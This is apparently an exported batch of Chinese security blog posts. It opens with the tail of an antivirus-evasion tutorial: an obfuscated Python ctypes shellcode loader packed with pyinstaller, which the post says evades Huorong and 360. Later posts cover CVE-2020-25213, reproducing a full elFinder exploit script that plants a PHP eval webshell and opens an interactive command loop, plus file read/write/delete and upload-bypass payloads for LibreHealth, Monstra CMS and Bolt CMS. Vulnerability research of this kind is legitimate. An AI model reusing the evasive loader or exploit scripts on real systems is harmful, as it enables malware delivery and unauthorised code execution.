bytearray(s50zd4mc)bc53udd6mwe8ucehku7ac9jq82chpmeylog1dfnvjf63ipd4tj1y0fl8youygux5gdi3wygp0qiyoqbxx0een59un7pq8o7xwneqoi0arnopsjb3pvzkll7bji5z1ebobtrtm9dlpv63utnucm27sn96cs3zvkbzsxm1zzomp2db5zmlpmq3i2q6plpgm0l3tjtotdj7os6v9kb500mis0fpfn0yhh3myzzij8r7gdnyvoedhcnxpjxoogs95wkucczqmy9xr8qw5zfhzuaj87kxhmpt9wdx9s2q5wylfsvl8wr8mtl2vl6bc65dg4qqmfgrk2mn1tawb53bumgcrtcf7r1db6nyr1c3d592n6joftfbretjm1f2r7bnj3mu6trnjynvsp8juw3jxqk9jk8g87efy1jo231winmxscb2u2qhv0m3q5l1nizghyqpv7ilata7r26pqmlob3tt9rcyljcw5snjrt7b0tst08i5jostyyk0pxiidivo0uy68npugwl627c3ezht26miz4ltszk = &quot;xaalc3nhqnszkylpx7t4gjukbs1re6dio2puzh3lwr8575ozew4hesx9aiyc1z1m9as5ghx4jc9f8i1lqhiqcgaddu1czescvrsf2dfsx5z7d09x1hh8fnv0914dyhp7gfh30ischxrqwfcfkcbqqhekki7m45hnfty2cbjd15mgq2dkrruunj78w6ao2xtbo3jhvfttc7ll46s1hezozx074j2oul4g8dfv1my9spaacrc2n8ase3x0pylcc5q4gtfoli9abakoz61fedfyjpis56w7bdhedvzwvgmma5b8vhk1tt8vfhcvz4mmdal7aaft7x76fnfto7a8nbbz593ua7b04m2vqbfwa6f2gwbxywo8suivisqln96ozl6k1x9oianju5awtzuk61iycoc75xwnm17xha7pp1pdm4m3aomvobtrcotd170xccplkrlypz6biuukkas970v5o9cxmveqdj87q3pkha1tyg3fysemkalme1wl9fhdohqvc6hrvlov4bty307c5dhdjupmbchch6zgkotlcmqg8uk4dv464c0er06x24eafdjr92i5a3a1b0suq9ujqcd0z8ef6dkqua54zyi9jpcdomza9g02v4k4r0nyixhjprfd95imprtiixcrdy79waunq4h25f4hn075rzy0alk1rnj3j0oqtuieqj5qg8ccz0mtc3gpswpyckryfydvt0nw8t6iapicbfu08rjqkce4rx8s0cybjiwowkfwbfjad49u06nm7p0md363b34vvvvejppx0utl3e47uez7l88mn2jvr5jx50clcw5ayy6afo0qpv36e9up5dbyk&quot; + &quot;dc8rclrz41gvmed5lhandwj87lifvvdwtk800lfrm4bf33og8a9o77y4x6ingugcimo7kldrmu0b01emm85jxs842gcdg6tmjcf56fysymyl1drlnunos5eja55b82yz9424vdt4stt7g2x81nqg7ch4gx0a5pxrr8frcbxk0zm7539a7ytu1v7ie2u2hx5yv6ev0pb5gsn8n0siykme0tlwqxfw7vrwm99gu216ciutwr5gu19cn1j9n6kujjyv5bbo2tbpded0ssij57cq4fcgmkjw91it3pyhjpbwhy2a4npxyz3j7l1pqppi1ykfm4kgrrwysptv0zzsjks47q989aegsdk27uqh5uj6hvpryz1cvpzodk38jwrqpf7cz4973w6fdptyoovwxfpqubdsk32fq3bcoxyr3a9nqckt7u90t48dxugkpnurnbr1iygu9qi77jqqi7d3k19ljdbogzqfxlsu8zbr8qkond492fwl71w74covapxl7aaxp6m4jx9204ym03rfyf9ewscugi2hom1vp5hnosifguw4v886zv2qji30vvtl1yjrago4tmmae0knkfyaakkh27l3a9fru7o93vtwfd48r4ffw73k8lp5k8g8q2tz052kndfpsdvkg93h9gsna85qt198h3niir72lo4dvh9lixtonvrpfo7skbosg2ps8wa1ja1uwul5s7uxrzj79soyo4aajok52sw3pvgj1ljmai40&quot;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64nds43ymxsskkaa25dkbcqysbkg8c3yzr6qdgnsb8vizunrexgmoz405d2x1enahbf0qvg9quiwpec39cgnmykcqi2aih52xu85n72b84gtsgu5z04qj6r5dgawxlsp1hbjpcetqtf4lxuj0k3a5y6dvhsb85dsso51ar4b9oqir40cbjqy5fvlqzx7cp86y1jvpuklbgbubj1nijs02gzt3ih7jg8ltzxfll2ul4pnsge6g9sypcmhv2anj4ipy74dhb8qglk8zgc0ez6sc6zbodrbeseleka2ze51dtm7dqtri1nn674x0e1j5jd5b8w9rjdub3f9dt22bshqw8vfmuz4zvfyjs2wv4fo1ne96cqvgiikv0j9aq66pth3qn0pieh2m43hmbjglzzj4exjjgi8g2893161b90asvuy0rm6ai4ho0ir3z9aibjydhdxrktq4fxat1n2qv12oj7zht6wafbg8430fk6wi9yzfhqn89waypsa4sj254bli99r8ddbkh4hfa5o5wsfw7oqargmpkvs68cna45ac20yorov9lve6dvxg4gwklfabj15zwsoi6k9iuy460hholsqcd3759klqjrw6s178ythm4wfi5ujrf2q6lzko1ikoc2698tribju621y2qbnk3i3jvecxlncbrvwc203mrdlytwxjmpvflw89mqu41opniz338y57h0x31 = 79966329 / 39623958ui41vo0urj = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(s50zd4mc)), ctypes.c_int(0x3000), ctypes.c_int(0x40))ehvapdqxisaekt9fjnt1xyw03pqvrl08q4crdtpmkfj7heaabsjuvzjc8oqzok6jhlo9ymh31za3tueanzbqpj6m8hxxa2ux1ta4b3udhpdurdnk4ampyldamcpi8sj95rlz0xeecytbwbq46t473t9dpq8d8ocznfstrk9d9x5ncw8ntj0vd2miq79yusghldkn7cnunr5zzwz4m87lw6g4vn2lcf61skxmeuzadas71tc5tdl0w01uy43vyyb5nsaexj9udjaxxro3b0ge1rjbn8l9fm743pjoug17yi2w465c8txylb9iteoe6on3tzxq80jb5c9st100x5obxkdsv5hfjmv1ek89jjxkfyzgepup7vuu0ei51eo0p2win78t57w793471wuyzzir6e6t4p4tg3dot664jgy0tpaa9g4djhd8y7v6ts76mjlks4a0prkanh9gq5lmjefuat3a66cvyww38vq2o0qf77kp2nsa4s7syf66jtrd4jeqva10ds6w4ihz8sc6a8vaio55911sy3d9dp0bfeio4uxppk5nf2vq29asvytl6hcfroxjl6hpzsujlw6jvvhdm1ghmkjiqfmy6ouv6xa709xs9p5jj13t0iijy7okxcqrkmkpyemls1wwvdi0hj11nf1sj546v337zjyozepce3ob6jyexi53wrq2gnyvy5a025 = 338387 + 51678963xqnsl = (ctypes.c_char * len(s50zd4mc)).from_buffer(s50zd4mc)ehvapdqxisaekt9fjnt1xyw03pqvrl08q4crdtpmkfj7heaabsjuvzjc8oqzok6jhlo9ymh31za3tueanzbqpj6m8hxxa2ux1ta4b3udhpdurdnk4ampyldamcpi8sj95rlz0xeecytbwbq46t473t9dpq8d8ocznfstrk9d9x5ncw8ntj0vd2miq79yusghldkn7cnunr5zzwz4m87lw6g4vn2lcf61skxmeuzadas71tc5tdl0w01uy43vyyb5nsaexj9udjaxxro3b0ge1rjbn8l9fm743pjoug17yi2w465c8txylb9iteoe6on3tzxq80jb5c9st100x5obxkdsv5hfjmv1ek89jjxkfyzgepup7vuu0ei51eo0p2win78t57w793471wuyzzir6e6t4p4tg3dot664jgy0tpaa9g4djhd8y7v6ts76mjlks4a0prkanh9gq5lmjefuat3a66cvyww38vq2o0qf77kp2nsa4s7syf66jtrd4jeqva10ds6w4ihz8sc6a8vaio55911sy3d9dp0bfeio4uxppk5nf2vq29asvytl6hcfroxjl6hpzsujlw6jvvhdm1ghmkjiqfmy6ouv6xa709xs9p5jj13t0iijy7okxcqrkmkpyemls1wwvdi0hj11nf1sj546v337zjyozepce3ob6jyexi53wrq2gnyvy5a025 = 338387 + 51678963ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ui41vo0urj), xqnsl, ctypes.c_int(len(s50zd4mc)))print(&quot;y5v8cap00i4ofd2qmwbsqrkx55oo85b36mdmdfnin9dada8eigu9mwwgsiilccyz0mqs5093c02oxd6gez7rdf9mrlh7597epbiurh1th1tzp7nmtba548veex163593kg4jx45hyuhnrcz9aanpirlowbvmua5f3yrs9kthg5d94b25y2gwiiy9owp7lxz1y0a8o0utcxgvkfv2relwf9hhn7int1jibwfmp83pfyz0mf5g8dl975ic5b3xt4f72rs7f4zl4rcx6vgi1pyhiztz9kxyy8ah8gdggtjyj9luxpyoj0638p80l2rmmbp3hof5jh1po9hnii2hggkch8k6natj0kz1r37l0oytpkl7ac3bi6n98qelitt18kvosh6kqbt1xec676k3s6d72nhzt1pa86fkp91xvicuh2mv3vpkvt9jxmaf3ktf201zrjs296wwu6881nk07vxipprspsthbzlu4jsiwca1gvwu1b7pun1satn4lfvh61j0o8dq6dzxaqgjnaz4h9v8etwvaqkwy62hfrjgenrtup2iktedcxs59fk88zwsm5as5wa8w1hodhc3qgaopo7udkta9j1prdoacsduqf9ce4nsjka1a4baf320ydmifcaufd94zemh58e6cbgc45cxdh86tosw4ib4nzi0m81vqbex9nd2rrgdtusu7ussok7ab7flph4ld3wthwjc12bvdfzfuye3kauqbq9u1&quot;)handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ui41vo0urj), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) 最后使用pyinstaller打包成exe 1pyinstaller -F shellcode.py 效果展示（2021年3月24日）火绒 360","tags":[{"name":"python","slug":"python","permalink":"https://mrwq.github.io/tags/python/"},{"name":"免杀","slug":"免杀","permalink":"https://mrwq.github.io/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"WordPress文件管理器插件0day漏洞解析-CVE-2020-25213","path":"WordPress文件管理器插件0day漏洞解析-CVE-2020-25213/","text":"昨天好多安全平台发布了WordPress插件WP File Manager的0day漏洞预警，然后我怀着好奇的心情解析了一波，花了些时间总算是解开了这个漏洞的神秘面纱。 从预警中可以看到漏洞在&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;php&#x2F;connector.minimal.php，然后里面的 关键代码说实话我一开始没看懂，大概意思就是两个文件包含，然后下面run elFinder。 为了弄懂这个我下载了WP File Manager插件6.0版本：下载地址https://wordpress.org/plugins/wp-file-manager/advanced/ 然后搭建了一个WordPress5.3.2，用phpstrom调试审计这个插件。 先看了两个文件包含，其中一个.&#x2F;vendor&#x2F;autoload.php文件是不存在的，另一个autoload.php也没什么特别的东西。 然后往下看，在然后我被41行这个给误导了 因为断点调试到这一行，就会跳转到一个叫elFinderConnector.class.php的文件里，然后在这个文件160行发现exec（）函数，我以为关键点就在这里，然后一直研究这个函数，然后并没有什么实际发现。。。 然后 我开始怀疑人生，可能是我太菜了吧，挖不到漏洞，别人都说了这里有0day我都挖不到，我也太菜了吧。。。 当我快要放弃的时候，我又看了一眼漏洞预警，其中几个字打开了我的思路，“这段代码来自elFinder项目”，这个意思是不是说WP File Manager插件使用了elFinder项目的代码，然后elFinder有漏洞。 于是，我又去百度elFinder漏洞 emmmmmmm。。。。。竟然真有漏洞，还是个CVE，CVE-2019-9194 漏洞原理啥的没细看，这里贴一下https://xz.aliyun.com/t/4444 然后我就找找有没有poc可以用，从exp-db上搜索elFinder，发现一个远程代码执行的链接，打开看看。 发现里面的存在漏洞的文件connector.php跟预警的文件connector.minimal.php挺像的，因为connector.minimal.php是示例文件所以是示例名，实际上正式项目要改成connector.php。应该是这个意思 然后就下载这个poc来验证我搭建的环境。 因为前面说了那个WP File Manager插件的作者直接搬运了elFinder的代码，所以连示例文件的名字都没有改，所以要稍微修改一下poc，将connector.php改成connector.minimal.php，然后将一句话改为eval，同时为方便调试将print的注释去掉 下面是漏洞验证环节： 可以看到在\\wp-content\\plugins\\wp-file-manager\\lib\\files目录下成功生成了文件，内容为一句话。与漏洞预警中说明的目录是一样的。 以上操作都是在未登录的情况下，也就是说是未授权RCE。这里贴一下poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#[+] Author: TUNISIAN CYBER#[+] Title: elFinder 2 Remote Command Execution (Via File Creation) Vulnerability#[+] Date: 06-05-2015#[+] Vendor: https://github.com/Studio-42/elFinder#[+] Type: WebAPP#[+] Tested on: KaliLinux (Debian)#[+] Twitter: @TCYB3R#[+] Time Line:# 03-05-2015:Vulnerability Discovered# 03-05-2015:Contacted Vendor# 04-05-2015:No response# 05-05-2015:No response# 06-05-2015:No response# 06-05-2015:Vulnerability publishedimport cookielib, urllibimport urllib2import sysprint&quot;\\x20\\x20+-------------------------------------------------+&quot;print&quot;\\x20\\x20| elFinder Remote Command Execution Vulnerability |&quot;print&quot;\\x20\\x20| TUNISIAN CYBER |&quot;print&quot;\\x20\\x20+-------------------------------------------------+&quot;host = raw_input(&#x27;\\x20\\x20Vulnerable Site:&#x27;)evilfile = raw_input(&#x27;\\x20\\x20EvilFileName:&#x27;)path=raw_input(&#x27;\\x20\\x20elFinder s Path:&#x27;)tcyber = cookielib.CookieJar()opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(tcyber))create = opener.open(&#x27;http://&#x27;+host+&#x27;/&#x27;+path+&#x27;/php/connector.minimal.php?cmd=mkfile&amp;name=&#x27;+evilfile+&#x27;&amp;target=l1_Lw&#x27;)print create.read()payload = urllib.urlencode(&#123; &#x27;cmd&#x27; : &#x27;put&#x27;, &#x27;target&#x27; : &#x27;l1_&#x27;+evilfile.encode(&#x27;base64&#x27;,&#x27;strict&#x27;), &#x27;content&#x27; : &#x27;&lt;?php eval($_GET[\\&#x27;cmd\\&#x27;]); ?&gt;&#x27; &#125;)write = opener.open(&#x27;http://&#x27;+host+&#x27;/&#x27;+path+&#x27;/php/connector.minimal.php&#x27;, payload)#print write.read()print &#x27;\\n&#x27;while True: try: cmd = raw_input(&#x27;[She3LL]:~# &#x27;) execute = opener.open(&#x27;http://&#x27;+host+&#x27;/&#x27;+path+&#x27;/admin/js/plugins/elfinder/files/&#x27;+evilfile+&#x27;?cmd=&#x27;+urllib.quote(cmd)) reverse = execute.read() print reverse; if cmd.strip() == &#x27;exit&#x27;: break except Exception: breaksys.exit() 这里更新pocsuit版本 https://blog.csdn.net/ordar123/article/details/110670335","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"LibreHealth 2.0.0 -任意文件操作漏洞利用","path":"LibreHealth 2.0.0 -任意文件操作漏洞利用/","text":"LibreHealth 2.0.0 -任意文件操作漏洞利用一、漏洞描述1、漏洞简述LibreHealthIO LH-EHR是一款开源的电子健康记录和医疗实践管理应用程序。 LibreHealthIO LH-HER REL-2.0.0版本中的导出模板存在任意文件写入漏洞。攻击者可利用该漏洞写入带有恶意内容的文件并可能远程执行代码。 二、机理分析1、LibreHealth 2.0.0 -文件操作漏洞影响版本： LibreHealthIO LH-EHR &lt; REL-2.0.0 漏洞编号：CVE-2018-1000646 如图所示，贴入关键代码。在&#x2F;patients&#x2F;import_template.php文件中使用了PHP的file_get_contents函数读取文件，file_put_contents函数写入文件，unlink函数删除文件。而且这三个函数传入参数之前，没有对传入参数做任何处理。其中写入文件函数，文件名和文件内容用户输入可控，文件路径可知，故可以导致远程代码执行。 三、攻击路径1.任意文件读取：在LibreHealth中，有权访问门户网站患者（经过身份验证）的用户可以发送恶意POST请求读取任意文件。 登录之后，构造payload POST &#x2F;patients&#x2F;import_template.php HTTP&#x2F;1.1 mode&#x3D;get&amp;docid&#x3D;&#x2F;proc&#x2F;version 2.任意文件写入：此攻击可导致RCE在LibreHealth中，有权访问门户网站患者（经过身份验证）的用户可以发送写入任意文件的恶意POST请求。 当你发送攻击时，你可以浏览写文件的网站payload.php在&#x2F;patients&#x2F;payload.php 登录之后，构造payload POST &#x2F;patients&#x2F;import_template.php HTTP&#x2F;1.1 mode&#x3D;save&amp;docid&#x3D;payload.php&amp;content&#x3D; 访问&#x2F;patients&#x2F;payload.php 3.任意文件删除：在LibreHealth中，有权访问门户网站患者（经过身份验证）的用户可以发送恶意POST请求删除任意文件。 登录之后，构造payload POST &#x2F;patients&#x2F;import_template.php HTTP&#x2F;1.1 mode&#x3D;delete&amp;docid&#x3D;payload.php 删除刚刚写入的payload.php 再访问&#x2F;patients&#x2F;payload.php。文件已删除 四、防御方案目前厂商还没有提供补丁或者升级程序","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"Monstra CMS 3.0.4-任意文件上传漏洞","path":"Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload/","text":"1. 简介Monstra是一个现代化的轻量级内容管理系统。它易于安装，升级和使用。 2. 环境搭建官方网站：https://monstra.org/下载最新版3.0.4 推荐使用wamp快速搭建环境，刚开始用phpstudy搭建，步骤都一样不知道为什么总是不成功，使用wamp一次就成功了。 解压源代码到wamp&#x2F;www目录 在wamp&#x2F;www中.htaccess中添加如下代码，用来支持解析.php7扩展的php文件 1addType application/x-httpd-php .php7 一定要添加这行代码，不然无法将.php7解析成php只能解析成文本，如图支持解析php7不支持解析php5，因为没有把.php5也加入解析成php程序。 3. 漏洞成因分析在\\plugins\\box\\filesmanager\\filesmanager.admin.php文件找到关键代码 1234567891011121314151617181920212223242526272829303132333435// Upload file// -------------------------------------if (Request::post(&#x27;upload_file&#x27;)) &#123; if (Security::check(Request::post(&#x27;csrf&#x27;))) &#123; $error = false; if ($_FILES[&#x27;file&#x27;]) &#123; if ( ! in_array(File::ext($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]), $forbidden_types)) &#123; $filepath = $files_path.Security::safeName(basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], File::ext($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])), null, false).&#x27;.&#x27;.File::ext($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]); $uploaded = move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $filepath); if ($uploaded !== false &amp;&amp; is_file($filepath)) &#123; Notification::set(&#x27;success&#x27;, __(&#x27;File was uploaded&#x27;, &#x27;filesmanager&#x27;)); &#125; else &#123; $error = &#x27;File was not uploaded&#x27;; &#125; &#125; else &#123; $error = &#x27;Forbidden file type&#x27;; &#125; &#125; else &#123; $error = &#x27;File was not uploaded&#x27;; &#125; if ($error) &#123; Notification::set(&#x27;error&#x27;, __($error, &#x27;filesmanager&#x27;)); &#125; if (Request::post(&#x27;dragndrop&#x27;)) &#123; Request::shutdown(); &#125; else &#123; Request::redirect($site_url.&#x27;/admin/index.php?id=filesmanager&amp;path=&#x27;.$path); &#125; &#125; else &#123; die(&#x27;Request was denied because it contained an invalid security token. Please refresh the page and try again.&#x27;); &#125;&#125; 上传的文件会先校验扩展名是否在$forbidden_types中，$forbidden_types是没有php7的。由此可知该系统使用黑名单机制来控制上传文件格式的，由于黑名单中缺少php7，并且管理员配置不当：允许php7格式解析成php代码时，可以触发该漏洞。 4. 漏洞复现管理员登录系统，选择上传，上传php7扩展的php木马，然后访问木马即可造成远程代码执行。 5. 影响版本Monstra CMS &lt;&#x3D; 3.0.4，最新版为3.0.4 6.防御方法暂无版本可升级，管理员可在\\plugins\\box\\filesmanager\\filesmanager.admin.php文件中$forbidden_types变量自行添加php7，用来禁止上传php7。 7. fofa搜索语法body&#x3D;”Monstra.org” 8. 坑点 默认配置是无法正常解析.php7文件为php，然后不管怎么搭建环境都无法复现，所以特别影响进度，后来才想到.htacces文件可以控制这个php解析类型，所以通过在.htaccess中添加如下代码addType application&#x2F;x-httpd-php .php7，用来支持解析.php7扩展的php文件。 PHPstudy无法搭建此环境。就算在.htaccess中添加如下代码addType application&#x2F;x-httpd-php .php7也无法成功复现，没找到原因，又耽误了很长时间，记录一下，避免踩坑。","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"bolt cms V3.7.0 xss和远程代码执行漏洞","path":"bolt cms V3.7.0 xss和远程代码执行漏洞/","text":"bolt cms V3.7.0 xss和远程代码执行漏洞1. 漏洞环境搭建github上下载对应版本，这里下载3.7.0. 1https://github.com/bolt/bolt/releases 解压后需要重命名以下文件： 1234mv .bolt.yml.dist .bolt.ymlmv composer.json.dist composer.jsonmv composer.lock.dist composer.lockmv src/Site/CustomisationExtension.php.dist src/Site/CustomisationExtension.php 为了快速搭建这里使用phpstudy，开启apache和mysql 点击网站，创建站点，选择好php版本并创建数据库，记住域名、数据库名称、用户名和密码 配置数据库app&#x2F;config&#x2F;config.yml。填好数据库名称、用户名和密码然后保存 然后浏览器访问http:&#x2F;&#x2F;上面自己设置的域名&#x2F;public即可到安装页面，第一次需要设置管理员账号和密码 12http://上面自己设置的域名/public http://上面自己设置的域名/public/bolt # 管理地址 2. 漏洞分析 XSS成因分析 该漏洞存在于vendor&#x2F;bolt&#x2F;bolt&#x2F;src&#x2F;Controller&#x2F;Backend&#x2F;Users.php。有两个变量$user和$userEntity用于存储和使用以显示此代码中的用户数据。$userEntity在传递给$form-&gt;isValid（），这表明$user有未编码的输入和$userEntity是具有编码的输入。也就是说使用$user未对用户输入编码，使用$userEntity可以对用户输入编码。 下面代码使用$user-&gt;getDisplayName（）而不是$userEntity-&gt;getDisplayName（），显示未编码的用户输入，所以导致XSS。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748switch ($action) &#123; case &#x27;disable&#x27;: if ($this-&gt;users()-&gt;setEnabled($id, false)) &#123; $this-&gt;app[&#x27;logger.system&#x27;]-&gt;info(&quot;Disabled user&#x27;&#123;$user-&gt;getDisplayname()&#125;&#x27;.&quot;, [&#x27;event&#x27; =&gt; &#x27;security&#x27;]);$this-&gt;flashes()-&gt;info(Trans::__(&#x27;general.phrase.user-disabled&#x27;, [&#x27;%s&#x27;=&gt; $user-&gt;getDisplayname()])); &#125; else &#123;$this-&gt;flashes()-&gt;info(Trans::__(&#x27;general.phrase.user-failed-disabled&#x27;,[&#x27;%s&#x27; =&gt; $user-&gt;getDisplayname()])); &#125; break; case &#x27;enable&#x27;: if ($this-&gt;users()-&gt;setEnabled($id, true)) &#123; $this-&gt;app[&#x27;logger.system&#x27;]-&gt;info(&quot;Enabled user&#x27;&#123;$user-&gt;getDisplayname()&#125;&#x27;.&quot;, [&#x27;event&#x27; =&gt; &#x27;security&#x27;]);$this-&gt;flashes()-&gt;info(Trans::__(&#x27;general.phrase.user-enabled&#x27;, [&#x27;%s&#x27;=&gt; $user-&gt;getDisplayname()])); &#125; else &#123;$this-&gt;flashes()-&gt;info(Trans::__(&#x27;general.phrase.user-failed-enable&#x27;,[&#x27;%s&#x27; =&gt; $user-&gt;getDisplayname()])); &#125; break; case &#x27;delete&#x27;: if ($this-&gt;isCsrfTokenValid() &amp;&amp; $this-&gt;users()-&gt;deleteUser($id)) &#123; $this-&gt;app[&#x27;logger.system&#x27;]-&gt;info(&quot;Deleted user&#x27;&#123;$user-&gt;getDisplayname()&#125;&#x27;.&quot;, [&#x27;event&#x27; =&gt; &#x27;security&#x27;]);$this-&gt;flashes()-&gt;info(Trans::__(&#x27;general.phrase.user-deleted&#x27;, [&#x27;%s&#x27;=&gt; $user-&gt;getDisplayname()])); &#125; else &#123;$this-&gt;flashes()-&gt;info(Trans::__(&#x27;general.phrase.user-failed-delete&#x27;,[&#x27;%s&#x27; =&gt; $user-&gt;getDisplayname()])); &#125; break; default: $this-&gt;flashes()-&gt;error(Trans::__(&#x27;general.phrase.no-such-action-for-user&#x27;,[&#x27;%s&#x27; =&gt; $user-&gt;getDisplayname()])); &#125; 远程代码执行成因分析 123456789public function rename($path, $newPath) &#123; $path = $this-&gt;normalizePath($path); $newPath = $this-&gt;normalizePath($newPath); $this-&gt;assertPresent($path); $this-&gt;assertAbsent($newPath); $this-&gt;doRename($path, $newPath); &#125; normalizePath（）函数在第823行acts的同一文件中定义作为Flysystem的normalizePath（）函数的包装器。已经习惯了 获取文件的“真实”路径。这用于验证文件位置等等。例如，.&#x2F;somedir&#x2F;..&#x2F;text.txt &#x3D;&#x3D; .&#x2F;text.txt &#x3D;&#x3D; text.txt 所以’.&#x2F;text.txt’ 传递给此函数，它返回 ‘text.txt’ 所以，从文件名 ‘backdoor.php&#x2F;.’ 将其传递给normalizePath（）它返回 ‘backdoor.php’ ,这正是我们所需要的。 所以数据流看起来，首先是值’backdoor.php&#x2F;.’ 传递给validateFileExtension（）返回NULL，因为后面没有文本最后一个点。所以，extesion过滤器被绕过了。接下来，相同的值是传递给normalizePath（），它删除最后一个“&#x2F;.”，因为它看起来像它是指向当前目录的路径。最后，文件被重命名为’backdoor.php’ 3. 漏洞测试1. xss构造payload 123POST /preview/page HTTP/1.1Host: localhost contenttype=pages&amp;title=title&amp;slug=testpage1&amp;teaser=teaser1&amp;body=&lt;script&gt;alert(1)&lt;/script&gt;&amp;id=151 2. 远程代码执行创建一个文件，然后编辑这个文件，写入木马保存。 1然后将shell.html重命名危shell.html.php\\. 即可变成shell.html.php 访问该文件即可执行命令 4. 影响版本Bolt CMS&lt;&#x3D; 3.7.0 5. 防御方案 1. XSS 使用具有编码值的变量来显示用户信息。使用$userEntity而不是$user 2. RCE 重命名时更改数据流。先把数据传过来normalizePath（）数据，然后通过validateFileExtension（）。这样，验证函数验证最终值。 6. 漏洞细节参考https://seclists.org/fulldisclosure/2020/Jul/4","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]}]